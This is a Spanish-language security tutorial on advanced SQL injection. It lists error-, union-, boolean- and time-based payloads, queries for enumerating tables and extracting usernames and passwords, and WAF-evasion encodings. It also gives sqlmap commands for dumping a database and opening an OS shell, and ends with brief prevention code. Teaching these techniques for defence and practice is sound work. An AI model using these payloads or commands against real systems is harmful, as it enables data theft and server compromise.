---
title: "SQL Injection Avanzado: Técnicas de Exfiltración"
description: "Domina técnicas avanzadas de SQL Injection incluyendo blind SQLi, time-based attacks y exfiltración de datos en escenarios complejos."
date: "2025-01-10"
author: "Security Research Team"
category: "Web Security"
tags: ["sql-injection", "web", "avanzado", "database"]
readTime: "25 min"
---

# SQL Injection Avanzado

La inyección SQL sigue siendo una de las vulnerabilidades más críticas en aplicaciones web. En este tutorial exploraremos técnicas avanzadas de explotación.

## Tipos de SQL Injection

### 1. Error-Based SQL Injection

Aprovecha mensajes de error para extraer información:

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

### 2. Union-Based SQL Injection

Combina resultados de múltiples queries:

```sql
' UNION SELECT NULL, username, password FROM users--
```

### 3. Blind SQL Injection

Cuando no hay output visible, usamos técnicas booleanas:

```sql
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
```

### 4. Time-Based Blind SQL Injection

Usa delays para confirmar vulnerabilidades:

```sql
'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

## Exfiltración de Bases de Datos

### Enumeración de Tablas (MySQL)

```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
```

### Enumeración de Columnas

```sql
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

### Extracción de Datos

```sql
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
```

## Técnicas de Bypass

### WAF Evasion

```sql
/*!50000UNION*/ /*!50000SELECT*/ username FROM users

%55NION %53ELECT username FROM users

UNION/**/SELECT/**/username/**/FROM/**/users
```

### Encoding y Obfuscación

```sql
CHAR(117,115,101,114,110,97,109,101)

0x75736572
```

## Automatización con SQLMap

```bash
sqlmap -u "http://target.com/page?id=1" --dbs

sqlmap -u "http://target.com/page?id=1" -D database --tables

sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

sqlmap -u "http://target.com/page?id=1" --os-shell
```

## Prevención

### Prepared Statements (PHP)

```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
```

### Parametrized Queries (Python)

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

## Conclusión

SQL Injection sigue siendo crítico. La práctica constante en entornos controlados es fundamental para dominar estas técnicas.
